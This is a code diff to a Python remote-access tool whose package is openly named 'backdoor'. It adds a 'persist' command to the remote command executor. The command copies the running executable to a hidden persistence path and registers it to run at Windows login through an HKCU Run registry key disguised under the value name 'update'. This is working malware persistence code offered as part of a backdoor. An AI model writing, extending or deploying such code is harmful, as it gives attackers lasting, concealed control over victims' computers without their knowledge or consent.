@@ -1,4 +1,7 @@
 import os
+from pathlib import Path
+import shutil
+import sys
 import subprocess
 from typing import Protocol
 
@@ -7,6 +10,7 @@ from backdoor.files.processor import FileProcessor
 from backdoor.models.commands import Command, LocalCommand, RemoteCommand, CommandResult
 from backdoor.server.registry import ClientRegistry
 from backdoor.utils.help import get_help_str
+from backdoor.utils.path import get_persistence_path, is_executable
 from backdoor.utils.systemreport import format_report
 
 
@@ -92,6 +96,8 @@ class RemoteCommandExecutor(CommandExecutor):
                 return self.file_processor.upload(command)
             case RemoteCommand(command="cd"):
                 return self.__chdir(command)
+            case RemoteCommand(command="persist"):
+                return self.__persist()
             case _:
                 return self.delegate_execute(command)
 
@@ -105,3 +111,30 @@ class RemoteCommandExecutor(CommandExecutor):
         except FileNotFoundError:
             raise InvalidArgumentException("no such file or directory")
         return CommandResult(success=True, returncode=0, stdout=path)
+
+    def __persist(self) -> CommandResult:
+        if not is_executable():
+            raise ValueError("Cannot persist on dev mode")
+        new_path = get_persistence_path()
+        os.makedirs(new_path.parent, exist_ok=True)
+        shutil.copyfile(sys.executable, new_path)  # error here
+        self.__register_on_startup(new_path)
+        return CommandResult(
+            returncode=0, success=True, stdout=f"Executable moved to ${new_path}"
+        )
+
+    def __register_on_startup(self, path: Path) -> None:
+        match sys.platform:
+            case "win32":
+                cmd = (
+                    r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run "
+                    r"/v update /t REG_SZ /f /d "
+                    f'"{path}"'
+                )
+                result = subprocess.run(cmd, shell=True, capture_output=True)
+                if result.returncode != 0:
+                    raise ValueError(f"{result.stdout}{result.stderr}")
+            case _:
+                raise ValueError(
+                    f"Startup registration not supported on {sys.platform}"
+                )
